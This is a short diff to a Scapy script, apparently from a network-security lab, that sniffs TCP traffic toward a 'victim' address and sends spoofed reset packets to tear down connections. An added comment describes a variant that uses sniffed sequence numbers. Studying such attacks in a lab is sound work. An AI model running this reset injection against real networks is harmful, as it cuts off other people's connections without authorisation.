@@ -8,5 +8,10 @@ def rstfunc(pkt):
     ls(pkt)
     send(pkt, verbose=0)
 
-f = "tcp and not ether src 02:42:fa:a7:22:45" # Excluding our own generated packets.
+f = "tcp and not ether src 02:42:fa:a7:22:45 and src dst 10.9.0.5" # Excluding our own generated packets and only considering destination as victim's IP.
 pkt = sniff(iface="br-fa4ab2f34bed", filter=f, prn=rstfunc)
+
+'''
+Another approach that could be used, was to listen for ACKs sent by the victim to discover the SEQ number of the client's next message
+and then spoof a RST packet from the client to the server. Or vice-versa.
+'''
